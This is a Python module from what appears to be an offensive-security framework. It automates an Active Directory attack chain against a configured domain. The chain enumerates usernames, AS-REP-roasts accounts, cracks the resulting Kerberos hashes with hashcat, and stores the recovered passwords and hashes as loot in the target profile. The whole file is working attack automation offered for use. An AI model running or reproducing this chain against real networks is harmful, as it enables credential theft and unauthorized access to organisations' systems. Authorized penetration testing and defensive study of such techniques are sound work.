def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, get_all_creds
    from core.paths import get_chain_artifacts_dir

    # --- TACTICAL PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'

    data, _ = load_current_profile()
    creds = get_all_creds(data)
    artifacts = get_chain_artifacts_dir(data["name"], "asrep")

    usernames = artifacts / "usernames.txt"
    hashes    = artifacts / "asrep_hashes.txt"
    cracked   = artifacts / "cracked.txt"

    # ---------------- PRECHECK ----------------
    if not data.get("domain") or not data.get("ip"):
        print(f"\n{R}[!] {W}{BOLD}CONFIGURATION ERROR{W}")
        print(f"{B}  └── {B}Status:{W} Domain and IP must be set in the active profile.")
        return

    print(f"\n{B}┌── {BOLD}CHAIN: AS-REP ROAST ➔ CRACK ➔ IMPORT{W}{B} ───────────────────┐{W}")
    print(f"{B}│{W}  {B}Target:{W} {C}{data['domain']}{W} ({C}{data['ip']}{W}){' ':<18} {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    if not getattr(args, "auto", False):
        choice = input(f"\n{Y}[?]{W} Initialize automated chain? (Y/n): ").lower()
        if choice not in ["", "y"]: return

    # ---------------- STEP 1: Get Usernames ----------------
    print(f"\n{B}[*]{W} {BOLD}PHASE 1/4: USERNAME ENUMERATION{W}")
    if not usernames.exists() or usernames.stat().st_size == 0:
        if creds:
            print(f"  {B}├── {B}Method:{W} LDAP Search")
            print(f"  └── {B}Module:{W} {Y}ad.enum-users{W}")
            run_module_by_name("ad.enum-users", ["--out", str(usernames), "--quiet"], data)
        else:
            extra = getattr(args, "extra", [])
            if not extra:
                print(f"  {R}└── {R}FAILURE:{W} No credentials and no wordlist provided.")
                return
            print(f"  {B}├── {B}Method:{W} Wordlist Generation")
            print(f"  └── {B}Module:{W} {Y}wordlist.gen-usernames{W}")
            run_module_by_name("wordlist.gen-usernames", [extra[0], str(usernames), "--quiet"], data)
        
        if not ensure_nonempty_file(usernames, "No usernames identified.", B, R): return
    else:
        print(f"  {B}└── {B}Status:{W} {DIM}Skipping (Artifact exists: {usernames.name}){W}")

    # ---------------- STEP 2: AS-REP Roast ----------------
    print(f"\n{B}[*]{W} {BOLD}PHASE 2/4: AS-REP ROASTING{W}")
    if not hashes.exists() or hashes.stat().st_size == 0:
        print(f"  {B}├── {B}Target:{W} {C}{usernames.name}{W}")
        print(f"  └── {B}Module:{W} {Y}ad.asreproast{W}")
        run_module_by_name("ad.asreproast", ["--file", str(usernames), "--out", str(hashes), "--quiet"], data)
        
        if not ensure_nonempty_file(hashes, "No AS-REP hashes found.", B, R): return
    else:
        print(f"  {B}└── {B}Status:{W} {DIM}Skipping (Artifact exists: {hashes.name}){W}")

    # ---------------- STEP 3: Crack ----------------
    print(f"\n{B}[*]{W} {BOLD}PHASE 3/4: RECOVERY (HASHCAT){W}")
    if not cracked.exists() or cracked.stat().st_size == 0:
        print(f"  {B}├── {B}Mode:{W}   18200 (Kerberos 5, etype 23, AS-REP)")
        print(f"  └── {B}Module:{W} {Y}crack.hash{W}")
        run_module_by_name("crack.hash", [str(hashes), "--mode", "18200", "--out", str(cracked), "--quiet"], data)

        if not ensure_nonempty_file(cracked, "Cracking failed or no matches.", B, R): return
    else:
        print(f"  {B}└── {B}Status:{W} {DIM}Skipping (Artifact exists){W}")

    # ---------------- STEP 4: Import ----------------
    print(f"\n{B}[*]{W} {BOLD}PHASE 4/4: CREDENTIAL IMPORT{W}")
    new_creds = run_module_by_name("parse.hash", [str(cracked)], data)

    if new_creds:
        from core.target import target_add_cred
        import argparse

        # --- THE LOOT BOX ---
        print(f"\n{G}┌── RECOVERED IDENTITIES ──────────────────────────────────┐{W}")
        for c in new_creds:
            user_str = c['user']
            print(f"{G}│{W}  {B}FOUND:{W} {G}{user_str:<18}{W} {B}TYPE:{W} {Y}{c['type']:<16}{W} {G}│{W}")
            
            target_add_cred(argparse.Namespace(
                user=c["user"],
                password=c["secret"] if c["type"] == "password" else None,
                hash=c["secret"] if c["type"] == "ntlm" else None,
                aes=None, ccache=None
            ))
        print(f"{G}└──────────────────────────────────────────────────────────┘{W}")
        print(f"\n{G}[+]{W} Successfully imported {BOLD}{len(new_creds)}{W} credentials to target profile.")

    print(f"\n{B}[{W}{G}√{W}{B}]{W} {BOLD}AS-REP ROAST CHAIN COMPLETE{W}\n")

def ensure_nonempty_file(path, msg, B, R):
    
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'
    
    if path.exists() and path.stat().st_size > 0:
        return True
    print(f"  {R}└── {R}FAILURE:{W} {msg}")
    return False